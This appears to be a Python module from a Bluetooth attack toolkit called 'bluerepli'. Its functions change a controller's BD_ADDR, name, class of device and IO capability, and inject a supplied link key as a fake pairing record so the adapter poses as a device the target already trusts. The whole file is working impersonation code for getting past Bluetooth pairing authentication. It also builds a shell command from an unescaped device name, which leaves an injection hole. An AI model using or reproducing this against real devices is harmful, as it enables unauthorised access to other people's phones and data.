#!/usr/bin/env python3

import os
import sys
import time
import shutil
import subprocess

from pathlib import PosixPath

from bluerepli.helper import add_paired_dev

from bluerepli.hci import hci_read_bd_addr
from bluerepli.hci import hci_write_authentication_enable
from bluerepli.hci import hci_read_local_name
from bluerepli.hci import hci_read_class_of_device
from bluerepli.hci import hci_write_simple_pairing_mode

from bluerepli.ui import INFO

def systemd_bluetoothd(op:str):
    # 重启bluetoothd服务在不同平台上具有差异
    with open("/etc/os-release") as f:
        d = {}
        for line in f:
            k,v = line.rstrip().split("=")
            if v.startswith('"'):
                v = v[1:-1]
            d[k] = v
    if(d['NAME'] == 'Buildroot'):
        subprocess.run(['/etc/init.d/S40Bluetooth', op])
    else:
        subprocess.run(['systemctl', op, 'bluetooth'])


def spoof_dev_name(name:str, iface='hci0'):
    '''Using bluetoothctl to change system-alias of the controller

    `system-alias <name>` 会修改 controller alias，并将新名字写进 
    `/var/lib/bluetooth/<BD_ADDR>/settings` 中。`sudo hciconfig <hcix> name <str>` 
    虽然也会修改 controller alias 但不会编辑 settings 文件。这会导致重启 bluetooth.service 后，
    名字还原为 settings 文件中的配置。因此使用前者，不使用后者。
    '''
    os.system(
        "printf 'select %s\\nsystem-alias %s\\nexit' | bluetoothctl" % (
            hci_read_bd_addr(iface), name.replace(' ', r'\ ')
        )
    )


def spoof_io_capability(ioc='NoInputNoOutput', iface='hci0'):
    '''Using bluetoothctl to change agent capability
    
    ioc -- DisplayOnly, DisplayYesNo, KeyboardOnly, NoInputNoOutput
    '''
    # os.system(
    #     "echo 'select %s\\nagent off\\nagent %s\\nagent on\\nexit' | bluetoothctl" % (
    #         hci_read_bd_addr(iface), ioc)
    # )

    os.system(
        "bt-agent -c %s -d" % ioc
    )


def spoof_bd_addr(bd_addr:str, iface='hci0'):
    '''Using spooftooph to change BD_ADDR of the controller'''
    systemd_bluetoothd('stop') # 停止bluetoothd可以兼容更多的平台
    # 当 HCI device 的状态为 down 时，spooftooph 会报错误 "Can't read version 
    # info for hci0: Network is down (100)". 所以在执行 spooftooph 前要确保 
    # HCI device up。
    cmd_args = ['hciconfig', iface, 'up']
    comproc = subprocess.run(cmd_args)
    if comproc.returncode != 0:
        print('[Error] spoof_bd_addr() 1:', ' '.join(cmd_args))
        exit(comproc.returncode)

    if hci_read_bd_addr(iface) != bd_addr.upper():
        comproc = subprocess.run(['spooftooph', '-i', iface, '-a', bd_addr])
        if comproc.returncode != 0:
            print('[Warning] Change BD_ADDR may not succeed, check yourself.')
            while True:
                a = input('Continue (y/n):').lower()
                if a == 'y':
                    # spooftooph 出问题后 HCI device 可能被 down。因此这里再执
                    # 行一次 hciconfig <hcix> up.
                    comproc = subprocess.run(cmd_args)
                    if comproc.returncode != 0:
                        print('[Error] spoof_bd_addr() 2:', ' '.join(cmd_args))
                        exit(comproc.returncode)
                    break
                elif a == 'n':
                    exit(0)
                else:
                    continue
        else:
            time.sleep(2) # 等待被修改 BD_ADDR 的 HCI device 重新初始化
    else:
        print('[INFO] Local BD_ADDR is already', bd_addr)
    
    # 通过 Wireshark 抓包可知 hciconfig <hcix> reset 将导致 
    # HCI_Delete_Stored_Link_Key command，即 controller 中所有的 link key 将被 
    # 删除。但是 controller 的名字最终保持不变。
    cmd_args = ['hciconfig', iface, 'reset']
    comproc = subprocess.run(cmd_args)
    if comproc.returncode != 0:
        print('[Error] main():', ' '.join(cmd_args))
        exit(comproc.returncode)

    # The Host shall not send additional HCI commands before the 
    # HCI_Command_Complete event related to the HCI_Reset command has been 
    # received.
    time.sleep(2)
    systemd_bluetoothd('start') # 恢复先前被中止的bluetoothd，确保更换物理地址后前后环境基本相同
    subprocess.run(['hciconfig', iface, 'up']) # 部分无udev的系统上，bluetoothd重启后会自动关闭hci


def spoof_cod(camo_cod, iface='hci0'):
    subprocess.run(['hciconfig', iface, "class", camo_cod])


def spoof_all(
    iface='hci0', camo_addr=None, camo_name=None, camo_cod=None,
    link_key=None, raddr=None, rname=None
):
    '''若提供 link_key，则 raddr 和 rname 也必须同时提供。
    
    另外 remote device 在一次蓝牙上电期间，可能会暂时缓存我们 BD_ADDR 与 name 的对应关系。
    因此为了使 camouflage name 立即生效，最好在修改 name 的同时也修改 BD_ADDR。
    '''
    print(INFO, 'Select \x1B[1;34m%s\x1B[0m' % iface)

    if camo_addr is None:
        camo_addr = hci_read_bd_addr(iface)
        print('[\x1B[1;33mWARNING\x1B[0m] No camouflage address specified, using current BD_ADDR \x1B[1;33m%s\x1B[0m' % camo_addr)
    else:
        spoof_bd_addr(camo_addr, iface)

    spoof_io_capability('NoInputNoOutput')

    if link_key is None:
        #hci_write_authentication_enable(0x00)
        # Remove possible existing paired dev
        paired_info_path = PosixPath("/var/lib/bluetooth") / camo_addr / raddr.upper()
        cache_file_path = PosixPath("/var/lib/bluetooth") / camo_addr / "cache" / raddr.upper()
        if paired_info_path.exists():
            shutil.rmtree(paired_info_path)
        
        if cache_file_path.exists():
            os.remove(cache_file_path)
        #sys.exit(0)
    elif raddr is not None and rname is not None:
        # 使能 SSP，如果不使能 SSP，连接目标时会遇到：
        #     PermissionError: [Errno 13] Permission denied
        # hci_write_simple_pairing_mode(0x01) # 虽然核心文档默认不使能 SSP，
        # 但现在大多数 host 都会默认使能 SSP。
        add_paired_dev(camo_addr, raddr, rname, link_key)
    else:
        print('[ERROR] No remote address and remote name for link key.')
        sys.exit(0)

    if camo_name is None:
        print('[\x1B[1;33mWARNING\x1B[0m] No camouflage name specified, using current name \x1B[1;33m%s\x1B[0m' % hci_read_local_name(iface))
    else:
        spoof_dev_name(camo_name, iface)

    # 使被修改过的 paired devices 生效等
    systemd_bluetoothd('restart')
    subprocess.run(['hciconfig', iface, 'up']) # 部分无udev的系统上，bluetoothd重启后会自动关闭hci
    time.sleep(1) # 等待 host 与 controller 准备完成

    if camo_cod is None:
        print('[\x1B[1;33mWARNING\x1B[0m] No camouflage class specified, using current class \x1B[1;33m%s\x1B[0m' % hci_read_class_of_device(iface))
        # 使用 hciconfig 与 spooftooth 均无法永久修改 class。
        # 执行 `hciconfig <hcix> class <val>` 或重启 bluetooth.service 都会
        # 导致 class 被重置。目前还没找到永久修改 class 的方法。因此把修改 class
        # 的操作放在 bluetooth.service 重启之后。
    else:
        spoof_cod(camo_cod, iface)
